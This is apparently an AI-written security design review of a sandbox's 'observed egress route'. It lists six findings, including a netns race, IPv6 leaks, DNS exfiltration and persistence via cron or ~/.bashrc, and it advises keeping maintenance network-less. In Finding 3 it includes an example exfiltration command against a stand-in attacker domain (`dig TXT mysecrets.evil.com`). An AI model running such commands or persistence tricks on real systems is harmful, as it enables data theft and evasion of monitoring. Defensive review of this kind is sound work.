# observed-route DESIGN panel: anthropic/claude-opus-4.1

_finish=stop seconds=145.6 cost=$0.4198 usage={'prompt_tokens': 19494, 'completion_tokens': 1698, 'total_tokens': 21192, 'cost': 0.41976, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.41976, 'upstream_inference_prompt_cost': 0.29241, 'upstream_inference_completions_cost': 0.12735}, 'completion_tokens_details': {'reasoning_tokens': 0, 'image_tokens': 0, 'audio_tokens': 0}}_

## SECURITY DESIGN REVIEW: Observed Egress Route

### Finding 1: Privilege-Drop Race Window
**ID:** PRIV-DROP-RACE  
**TITLE:** Race between netns creation and setns+exec allows unobserved egress  
**SEVERITY:** HIGH  
**WHERE:** Step 1-5 of privileged helper, between netns creation and setns  
**CONCRETE ATTACK:** Another process with CAP_SYS_ADMIN could `ip netns attach salient_route_u<uid>_<runid> <pid>` to a different process between steps 1 and 5. Or more simply: if the helper crashes/is killed after creating the routed netns but before dropping privileges, the netns persists with its route+NAT intact. A subsequent attacker process could `setns` into it and egress WITHOUT the observer hook being active for that later run.  
**CAUGHT BY OTHER CONTROL:** Partially - the per-run guard checks the observer is live, but only AFTER entering the netns. If the helper dies between steps 3-4, the route exists without the FORWARD hook.  
**FIX:** Make netns creation+teardown atomic with the process lifetime via `unshare()` syscall directly rather than persistent `/run/netns/<name>`. Or use a cleanup handler that guarantees teardown even on SIGKILL.

### Finding 2: Incomplete IPv6 Disablement
**ID:** IPV6-BYPASS  
**TITLE:** IPv6 disable in netns happens AFTER veth is up  
**SEVERITY:** MEDIUM  
**WHERE:** Step 4 of helper - IPv6 disabled only in the netns after interfaces are already up  
**CONCRETE ATTACK:** IPv6 is disabled via sysctl in the netns (step 4) but the veth pair is created and brought up earlier (step 2). There's a window where IPv6 link-local addresses auto-configure and could potentially route before the disable. Also, disabling IPv6 via sysctl doesn't remove already-assigned addresses.  
**CAUGHT BY OTHER CONTROL:** The FORWARD policy-drop should catch this, but only if the IPv6 rules are properly installed. The design says "unless a symmetric v6 route + dests6 FORWARD rule is set up" but doesn't show the IPv6 DROP rules.  
**FIX:** Disable IPv6 on the veth interface BEFORE bringing it up, or better: don't create IPv6 addresses at all via `ip link add ... type veth` with explicit v4-only config.

### Finding 3: DNS/UDP Content Exfiltration
**ID:** DNS-EXFIL  
**TITLE:** DNS queries and UDP payloads completely unobserved for content  
**SEVERITY:** MEDIUM  
**WHERE:** Observer FORWARD hook - only captures dest IP:port  
**CONCRETE ATTACK:** Attacker can exfiltrate arbitrary data via DNS TXT queries (e.g., `dig TXT mysecrets.evil.com`) or custom UDP protocols. The observer sees "8.8.8.8:53" but not that secrets were encoded in the query. This is a documented residual but undermines the "observed" claim.  
**CAUGHT BY OTHER CONTROL:** None - explicitly documented as out of scope.  
**FIX:** DNS-aware proxy or content-mediating transparent proxy (already listed as alternative).

### Finding 4: Unprivileged bwrap Inheritance of Privileged Netns
**ID:** BWRAP-INHERIT  
**TITLE:** bwrap inheriting a root-created netns may not properly isolate  
**SEVERITY:** LOW  
**WHERE:** Step 5 of helper - exec bwrap WITHOUT --unshare-net  
**CONCRETE ATTACK:** The design correctly notes that unprivileged processes cannot setns into a root-owned netns. However, having bwrap INHERIT the netns (rather than create one) means bwrap's own isolation logic doesn't fully control the network stack. If bwrap has bugs in how it handles inherited namespaces vs created ones, this could be a problem.  
**CAUGHT BY OTHER CONTROL:** The cap-drop and deputy-mask controls still apply. The attack surface is limited to bwrap bugs specifically around inherited netns handling.  
**FIX:** Have the helper create a user-owned netns that bwrap can setns into, or document that this relies on bwrap correctly handling inherited namespaces.

### Finding 5: Async Laundering Via Full Filesystem Write
**ID:** ASYNC-LAUNDER  
**TITLE:** Full filesystem write allows planting delayed egress commands  
**SEVERITY:** MEDIUM  
**WHERE:** Maintenance sandbox design - full read-write host view  
**CONCRETE ATTACK:** A malicious maintenance command can write a systemd timer, cron job, or modify ~/.bashrc to execute after the observed window closes. This completely bypasses the observation since the egress happens from a different process at a different time.  
**CAUGHT BY OTHER CONTROL:** None - explicitly documented as accepted residual.  
**FIX:** Read-only bind mounts for system directories, or time-bounded observation windows that extend beyond the immediate command.

### Finding 6: FORWARD Chain Fragments and Conntrack
**ID:** FORWARD-INCOMPLETE  
**TITLE:** FORWARD hook may miss fragmented packets or rely on conntrack state  
**SEVERITY:** LOW  
**WHERE:** Observer FORWARD hook implementation  
**CONCRETE ATTACK:** Large UDP packets that fragment may have only the first fragment containing port information. Subsequent fragments won't match the nft rule that checks `tcp dport`. Also, if conntrack is disabled or flushed, established connections might not be properly tracked.  
**CAUGHT BY OTHER CONTROL:** The policy-drop default should catch fragments, but they won't be logged/observed correctly.  
**FIX:** Add explicit fragment handling rules and ensure conntrack is enabled for the veth interface.

## META-QUESTION: Is This Worth Building?

**NO, this is not worth building versus keeping maintenance network-less.**

The design adds significant complexity and attack surface (privileged helper, new egress path) while providing only "observation" not enforcement. The observed route undermines the strong guarantee that "egress.py is the SOLE IP path" - a critical security property. The ability to exfiltrate via DNS/UDP without content inspection, combined with async laundering through filesystem writes, means a malicious actor can still exfiltrate data, just with more steps.

## STEELMAN

The design is technically sound in its core mechanism - the privileged helper correctly drops privileges before executing user code, and the FORWARD/iifname hook will reliably observe TCP destinations. For organizations that absolutely need maintenance network access and can accept destination-only logging, this provides a middle ground between no network and unrestricted network. The monotonic fallback ladder ensures the system fails closed rather than open.

## VERDICT

**SERIOUS_FLAWS** - While technically implementable, the design undermines the core security guarantee of egress.py being the sole IP path without providing sufficient compensating controls. **Do the alternative: keep maintenance network-less** and require operators to use the mediated egress.py path for any network operations, accepting the inconvenience for the security benefit.
